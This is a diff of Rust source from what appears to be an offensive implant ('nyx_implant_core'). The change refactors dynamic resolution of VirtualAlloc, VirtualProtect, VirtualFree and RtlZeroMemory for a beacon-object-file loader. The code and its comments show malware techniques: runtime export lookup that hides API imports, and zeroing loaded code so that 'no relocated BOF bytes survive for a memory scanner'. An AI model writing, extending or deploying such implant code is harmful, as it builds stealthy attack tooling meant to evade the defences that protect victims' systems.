@@ -33,15 +33,15 @@ type VirtualProtectFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut 
 type VirtualFreeFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
 
 unsafe fn virtual_alloc() -> Option<VirtualAllocFn> {
-    let a = unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") }?;
+    let a = unsafe { crate::export_addr(b"kernel32.dll", b"VirtualAlloc") }?;
     Some(unsafe { core::mem::transmute::<usize, VirtualAllocFn>(a) })
 }
 unsafe fn virtual_protect() -> Option<VirtualProtectFn> {
-    let a = unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualProtect") }?;
+    let a = unsafe { crate::export_addr(b"kernel32.dll", b"VirtualProtect") }?;
     Some(unsafe { core::mem::transmute::<usize, VirtualProtectFn>(a) })
 }
 unsafe fn virtual_free() -> Option<VirtualFreeFn> {
-    let a = unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualFree") }?;
+    let a = unsafe { crate::export_addr(b"kernel32.dll", b"VirtualFree") }?;
     Some(unsafe { core::mem::transmute::<usize, VirtualFreeFn>(a) })
 }
 
@@ -163,9 +163,7 @@ impl Drop for SectionGuard {
 /// Fill a region with zeros (RtlZeroMemory when resolvable, else a hand-rolled
 /// loop) — no relocated BOF bytes survive for a memory scanner.
 unsafe fn zero_region(p: *mut c_void, len: usize) {
-    if let Some(addr) =
-        unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"RtlZeroMemory") }
-    {
+    if let Some(addr) = unsafe { crate::export_addr(b"kernel32.dll", b"RtlZeroMemory") } {
         type RtlZero = unsafe extern "system" fn(*mut c_void, usize);
         let f: RtlZero = unsafe { core::mem::transmute(addr) };
         unsafe { f(p, len) };
